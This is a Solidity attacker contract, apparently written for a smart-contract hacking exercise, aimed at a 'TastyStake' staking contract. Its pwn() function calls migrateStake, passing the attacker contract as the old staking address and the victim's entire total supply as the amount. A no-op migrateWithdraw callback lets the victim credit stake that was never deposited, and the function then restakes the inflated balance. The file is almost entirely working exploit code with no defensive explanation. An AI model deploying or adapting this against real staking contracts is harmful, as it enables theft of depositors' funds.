// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// pull interface from contract

interface ITastyStake {
    function migrateWithdraw(address staker, uint256 amount) external;
    function migrateStake(address oldStaking, uint256 amount) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function withdrawAll(bool claim) external;
    function transfer(address to, uint256 amount) external;
    function stakeFor(address _for, uint256 _amount) external;
    function stakeAll() external;
}

contract TastyStakingExploiter {
    //setup
    address pwner;
    address victim;
    IERC20 steak;
    ITastyStake t_stake;
    uint256 booty;
    uint256 calls = 0;

    constructor(address _victim, address _steak) {
        pwner = msg.sender;
        victim=_victim;
        t_stake = ITastyStake(_victim);
        steak = IERC20(_steak);
    }

    function pwn() external {
        booty = t_stake.totalSupply();
        console.log(booty);
        t_stake.migrateStake(address(this), booty);
        console.log("done calling shizz");
        // t_stake.withdrawAll(true);

        uint256 bounty = t_stake.balanceOf(address(this));
        // steak.approve(victim, bounty);
        t_stake.stakeAll();
        // t_stake.transfer(pwner, bounty);
        uint256 bounty2 = t_stake.balanceOf(pwner);
        console.log("Contract value:",bounty);
        console.log("Pwner Value",bounty2);
    }

    function touchBooty() external{

    }

    function migrateWithdraw(address staker, uint256 amount) external {
        // if(++calls < 10){
        // console.log("called our contract");
            
        //     t_stake.migrateStake(address(this), booty);
        // }
    }
}
